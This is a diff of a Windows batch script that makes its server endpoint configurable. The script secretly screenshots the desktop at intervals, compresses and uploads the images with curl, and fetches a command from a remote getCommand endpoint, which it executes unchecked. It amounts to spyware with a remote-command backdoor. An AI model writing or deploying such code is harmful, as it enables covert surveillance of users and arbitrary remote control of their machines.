@@ -1,4 +1,5 @@
 rem main.bat
+set /p endpoint=<endpoint
 set /p yesterday=<date
 echo %date% > today
 set /p today=<today
@@ -19,15 +20,15 @@ FOR /F %%i IN ('dir *jpg /b /O-D') DO (
 )
 :send
 
-curl -F "data=@%file%" -F %form% http://monitor.local/api/photo
+curl -F "data=@%file%" -F %form% %endpoint%/api/photo
 set fn=%random%.jpg
 nircmd.exe cmdwait %interval% savescreenshot %fn%
 magick.exe mogrify -resize 1366x768 -format jpg -quality 10 %fn%
-curl http://monitor.local/api/status > status
+curl %endpoint%/api/status > status
 set /p status=<status
 IF "%status%"=="%USER%" (set interval=10000) ELSE (set interval=60000)
 
-curl http://monitor.local/api/getCommand/1 > temp.txt
+curl %endpoint%/api/getCommand/1 > temp.txt
 set /p CMD=< temp.txt
 %CMD%
 
